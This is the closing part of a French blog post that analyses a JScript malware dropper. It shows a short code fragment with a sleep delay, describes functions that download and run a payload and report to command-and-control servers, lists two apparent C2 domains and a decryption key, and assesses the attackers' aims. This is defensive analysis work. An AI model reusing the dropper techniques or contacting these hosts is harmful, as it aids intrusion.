</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">case</span> <span style="color:#e6db74">&#34;fail&#34;</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">fail</span>();
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">break</span>;
</span></span><span style="display:flex;"><span>}
</span></span><span style="display:flex;"><span><span style="color:#75715e">//...
</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span><span style="color:#a6e22e">WScript</span>.<span style="color:#a6e22e">Sleep</span>((Math.<span style="color:#a6e22e">random</span>() <span style="color:#f92672">*</span> <span style="color:#ae81ff">300</span> <span style="color:#f92672">+</span> <span style="color:#ae81ff">3600</span>) <span style="color:#f92672">*</span> <span style="color:#ae81ff">1000</span>);
</span></span></code></pre></div><p>La fonction <code>work</code> semble télécharger le payload, le lancer et envoyer l&rsquo;information au C2 si le lancement à réussi, sans chercher à envoyer l&rsquo;erreur.</p>
<p>La fonction <code>fail</code>, quant à elle, créée une tâche planifiée avant de la supprimer aussitôt et quitte le programme.</p>
<h2 id="analyse-de-la-menace" class="relative group">Analyse de la menace <span class="absolute top-0 w-6 transition-opacity opacity-0 ltr:-left-6 rtl:-right-6 not-prose group-hover:opacity-100"><a class="group-hover:text-primary-300 dark:group-hover:text-neutral-700" style="text-decoration-line: none !important;" href="#analyse-de-la-menace" aria-label="Ancre">#</a></span></h2>
<p>Il est ici question d&rsquo;aller plus loin que la lecture de code. Mon objectif est de monter dans la <a href="https://www.sans.org/tools/the-pyramid-of-pain/">Pyramide de la douleur</a> ; aller plus loin que l&rsquo;extraction habituelle d&rsquo;IoCs comme des IP ou des noms de domaine mais essayer de comprendre la cible de ce malware et les objectifs de leurs auteurs. Cette analyse est sujet à mes interprétations.</p>
<p>A mon sens, ce code malveillant n&rsquo;a pas été créé par un APT et n&rsquo;est pas non plus à son usage. Plusieurs indications vont dans ce sens, à commencer par le fait qu&rsquo;aucun message d&rsquo;erreur n&rsquo;est envoyé vers les C2. Il n&rsquo;y a pas la volonté de compromettre à tout prix <strong>la</strong> machine sur laquelle est présent le document. De plus, le code n&rsquo;a pas l&rsquo;air de contenir une détection de VM, il n&rsquo;y a pas la volonté de se protéger contre les analystes. Cependant, il est possible que les informations de reconnaissance envoyés aux C2 puissent servir à cet usage. Enfin, les dates du déclenchement de la tâche planifiée, et donc par extension du malware final, ne sont pas précises. Tout cela tend à montrer qu&rsquo;il n&rsquo;y a pas un ciblage particulier.</p>
<p>De plus, la reconnaissance est automatisée et particulièrement bruyante. Les commandes sont lancées les unes à la suite des autres et <code>net user</code>, par exemple, est un marqueur très fort pour tout analyste SOC. Dans le même esprit, les noms de domaines utilisées (<code>http://www.saipadiesel124.com/</code> et <code>http://www.folk-cantabria.com/</code>) pourraient sembler suspects pour un analyste SOC, à cause de leur nom, d&rsquo;une part, mais également à cause du trafic en <code>HTTP</code>, d&rsquo;autre part.</p>
<p>L&rsquo;exécution finale du script est plus obfusquée que le reste du code (<code>WScriptShell</code>), à mon sens, cela traduit la volonté de ne pas déclencher un antivirus. Un dernier élément plus spéculatif est l&rsquo;utilisation de la clef de chiffrement <code>EzZETcSXyKAdF_e5I2i1</code>, qui a été utilisée pour déchiffrer une partie du code <code>JScript</code>, et qui pourrait être utilisée de nouveau pour déchiffrer le malware final. La cible pourrait donc être une entreprise très faiblement protégée voire un poste non monitoré d&rsquo;un particulier.</p>
<p>Enfin, le payload est exécuté uniquement quand l&rsquo;utilisateur est connecté et la reconnaissance traduit une volonté de se latéraliser ; les pirates partant du principe que le malware peut se trouver sur un poste sans intérêt. De plus, l&rsquo;utilisation, par les C2, de <code>Wordpress</code> peut laisser penser à une industrialisation de l&rsquo;infrastructure, et, par extension, d&rsquo;une recherche de rentabilité.</p>
<p>En conclusion, il semblerait que ce code soit à destination d&rsquo;une cible peu protégée, peu monitorée et peu ou pas ciblée. Cela indique que les pirates ratissent large, probablement dans un but financier.</p>

      </div>
    </section>
    <footer class="pt-8 max-w-prose print:hidden">
      
  <div class="flex">
    
      
      
        
        <img
          class="w-24 h-24 !mt-0 !mb-0 ltr:mr-4 rtl:ml-4 rounded-full"
          width="96"
          height="96"
          alt="nathan.out"
          src="/img/author_hu00bba01d950a59fc7877b060fc60a3bd_21567_192x192_fill_q75_box_smart1.jpg"
        />
      
    
    <div class="place-self-center">
      
        <div class="text-[0.6rem] leading-3 text-neutral-500 dark:text-neutral-400 uppercase">
          Auteur
        </div>
        <div class="font-semibold leading-6 text-neutral-800 dark:text-neutral-300">
          nathan.out
        </div>
      
      
      <div class="text-2xl sm:text-lg">
  <div class="flex flex-wrap text-neutral-400 dark:text-neutral-500">
    
      
        <a
          class="px-1 hover:text-primary-700 dark:hover:text-primary-400"
          href="https://github.com/nathan-out"
          target="_blank"
          aria-label="Github"
          rel="me noopener noreferrer"
          >

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><path fill="currentColor" d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>

  </span>

</a
        >
      
    
  </div>

</div>
    </div>
  </div>


      

      
  
    
    
    
    <div class="pt-8">
      <hr class="border-dotted border-neutral-300 dark:border-neutral-600" />
      <div class="flex justify-between pt-3">
        <span>
          
            <a class="flex group" href="/posts/automatiser-la-detection-de-la-manipulation-de-linformation-en-cas-reel/">
              <span
                class="mr-3 ltr:inline rtl:hidden text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&larr;</span
              >
              <span
                class="ml-3 ltr:hidden rtl:inline text-neutral-700 dark:text-neutral group-hover:text-primary-600 dark:group-hover:text-primary-400"
                >&rarr;</span
              >
              <span class="flex flex-col">
                <span
                  class="mt-[0.1rem] leading-6 group-hover:underline group-hover:decoration-primary-500"
                  >Automatiser la détection de la manipulation de l'information en cas réel</span
                >
                <span class="mt-[0.1rem] text-xs text-neutral-500 dark:text-neutral-400">
                  
                    <time datetime="2023-07-10 14:53:25 &#43;0300 &#43;0300">10 juillet 2023</time>
                  
                </span>
              </span>
            </a>
          
        </span>
        <span>
          
        </span>
      </div>
    </div>
  


      
    </footer>
  </article>

        
          <div
            class="absolute top-[100vh] ltr:right-0 rtl:left-0 w-12 pointer-events-none bottom-0"
          >
            <a
              href="#the-top"
              class="w-12 h-12 sticky pointer-events-auto top-[calc(100vh-5.5rem)] bg-neutral/50 dark:bg-neutral-800/50 backdrop-blur rounded-full text-xl flex items-center justify-center text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
              aria-label="Faire défiler jusqu&#39;au bas de la page"
              title="Faire défiler jusqu&#39;au bas de la page"
            >
              &uarr;
            </a>
          </div>
        
      </main><footer class="py-10 print:hidden">
  
  
  <div class="flex items-center justify-between">
    <div>
      
      
        <p class="text-sm text-neutral-500 dark:text-neutral-400">
            &copy;
            2023
            nathan.out
        </p>
      
      
      
    </div>
    
    
      <div
        class="text-sm cursor-pointer text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400 ltr:mr-14 rtl:ml-14"
      >
        <button
          id="appearance-switcher"
          class="w-12 h-12 "
          type="button"
          title="Passer au thème sombre"
        >
          <span class="inline dark:hidden">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M32 256c0-123.8 100.3-224 223.8-224c11.36 0 29.7 1.668 40.9 3.746c9.616 1.777 11.75 14.63 3.279 19.44C245 86.5 211.2 144.6 211.2 207.8c0 109.7 99.71 193 208.3 172.3c9.561-1.805 16.28 9.324 10.11 16.95C387.9 448.6 324.8 480 255.8 480C132.1 480 32 379.6 32 256z"/></svg>

  </span>

</span>
          <span class="hidden dark:inline">

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M256 159.1c-53.02 0-95.1 42.98-95.1 95.1S202.1 351.1 256 351.1s95.1-42.98 95.1-95.1S309 159.1 256 159.1zM509.3 347L446.1 255.1l63.15-91.01c6.332-9.125 1.104-21.74-9.826-23.72l-109-19.7l-19.7-109c-1.975-10.93-14.59-16.16-23.72-9.824L256 65.89L164.1 2.736c-9.125-6.332-21.74-1.107-23.72 9.824L121.6 121.6L12.56 141.3C1.633 143.2-3.596 155.9 2.736 164.1L65.89 256l-63.15 91.01c-6.332 9.125-1.105 21.74 9.824 23.72l109 19.7l19.7 109c1.975 10.93 14.59 16.16 23.72 9.824L256 446.1l91.01 63.15c9.127 6.334 21.75 1.107 23.72-9.822l19.7-109l109-19.7C510.4 368.8 515.6 356.1 509.3 347zM256 383.1c-70.69 0-127.1-57.31-127.1-127.1c0-70.69 57.31-127.1 127.1-127.1s127.1 57.3 127.1 127.1C383.1 326.7 326.7 383.1 256 383.1z"/></svg>

  </span>

</span>
        </button>
      </div>
    
  </div>
  
  
</footer>
<div
  id="search-wrapper"
  class="fixed inset-0 z-50 flex flex-col p-4 sm:p-6 md:p-[10vh] lg:p-[12vh] w-screen h-screen cursor-default bg-neutral-500/50 backdrop-blur-sm dark:bg-neutral-900/50 invisible"
  data-url="https://nathan-out.github.io/"
>
  <div
    id="search-modal"
    class="flex flex-col w-full max-w-3xl min-h-0 mx-auto border rounded-md shadow-lg border-neutral-200 top-20 bg-neutral dark:bg-neutral-800 dark:border-neutral-700"
  >
    <header class="relative z-10 flex items-center justify-between flex-none px-2">
      <form class="flex items-center flex-auto min-w-0">
        <div class="flex items-center justify-center w-8 h-8 text-neutral-400">
          

  <span class="relative inline-block align-text-bottom icon">
    <svg aria-hidden="true" focusable="false" data-prefix="fas" data-icon="search" class="svg-inline--fa fa-search fa-w-16" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512"><path fill="currentColor" d="M505 442.7L405.3 343c-4.5-4.5-10.6-7-17-7H372c27.6-35.3 44-79.7 44-128C416 93.1 322.9 0 208 0S0 93.1 0 208s93.1 208 208 208c48.3 0 92.7-16.4 128-44v16.3c0 6.4 2.5 12.5 7 17l99.7 99.7c9.4 9.4 24.6 9.4 33.9 0l28.3-28.3c9.4-9.4 9.4-24.6.1-34zM208 336c-70.7 0-128-57.2-128-128 0-70.7 57.2-128 128-128 70.7 0 128 57.2 128 128 0 70.7-57.2 128-128 128z"/></svg>

  </span>


        </div>
        <input
          type="search"
          id="search-query"
          class="flex flex-auto h-12 mx-1 bg-transparent appearance-none focus:outline-dotted focus:outline-transparent focus:outline-2"
          placeholder="Rechercher"
          tabindex="0"
        />
      </form>
      <button
        id="close-search-button"
        class="flex items-center justify-center w-8 h-8 text-neutral-700 dark:text-neutral hover:text-primary-600 dark:hover:text-primary-400"
        title="Fermer (Esc)"
      >
        

  <span class="relative inline-block align-text-bottom icon">
    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 320 512"><path fill="currentColor" d="M310.6 361.4c12.5 12.5 12.5 32.75 0 45.25C304.4 412.9 296.2 416 288 416s-16.38-3.125-22.62-9.375L160 301.3L54.63 406.6C48.38 412.9 40.19 416 32 416S15.63 412.9 9.375 406.6c-12.5-12.5-12.5-32.75 0-45.25l105.4-105.4L9.375 150.6c-12.5-12.5-12.5-32.75 0-45.25s32.75-12.5 45.25 0L160 210.8l105.4-105.4c12.5-12.5 32.75-12.5 45.25 0s12.5 32.75 0 45.25l-105.4 105.4L310.6 361.4z"/></svg>

  </span>


      </button>
    </header>
    <section class="flex-auto px-2 overflow-auto">
      <ul id="search-results">
        
      </ul>
    </section>
  </div>
</div>

    </div>
  </body>
</html>
